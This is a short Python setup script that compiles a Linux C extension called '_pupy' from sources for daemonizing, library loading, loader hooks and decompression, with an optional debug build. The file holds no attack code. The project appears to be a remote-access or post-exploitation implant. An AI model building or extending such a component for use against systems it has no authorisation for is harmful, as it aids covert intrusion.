#!/usr/bin/env python3
# -*- coding: UTF8 -*-

from distutils.core import setup, Extension
import sys


def main():
    extra_compile_args = ["-D_PUPY_SO=1", "-DLinux=1"]
    extra_sources = []
    if "--debug" in sys.argv:
        extra_compile_args += ["-DDEBUG"]
        extra_sources+=["../common/debug.c"]
        print("compiling _pupy.so with DEBUG=1")
    setup(name="_pupy",
          version="1.0.0",
          description="_pupy linux c extension",
          author="n1nj4sec",
          ext_modules=[Extension("_pupy",sources=(["pupy.c", "daemonize.c", "tmplibrary.c", "ld_hooks.c", "decompress.c"]+extra_sources),
            include_dirs=[".","../common"],
             extra_compile_args=extra_compile_args
        )])

if __name__ == "__main__":
    main()

